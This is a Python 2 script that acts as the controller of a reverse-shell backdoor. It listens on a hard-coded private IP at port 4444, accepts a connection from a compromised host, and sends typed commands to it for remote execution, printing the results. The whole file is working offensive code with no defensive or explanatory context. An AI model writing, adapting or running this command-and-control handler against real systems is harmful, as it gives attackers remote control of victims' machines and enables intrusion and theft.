import socket , json
 
 
class Listner:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listner.bind((ip,port))
        print("[+] Waiting for incoming connections")
        listner.listen(0)
        self.connection ,address = listner.accept()
        print("[+] Got a connection form" + str(address))
  
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8')) 
 
    def reliable_recv(self):
        json_data = ""
        while True:
            try: 
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
 
    def execute_remote(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        
        return self.reliable_recv()
 
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            result = self.execute_remote(command)
            print(result)
 
mylistner = Listner("192.168.195.152",4444)
mylistner.run()
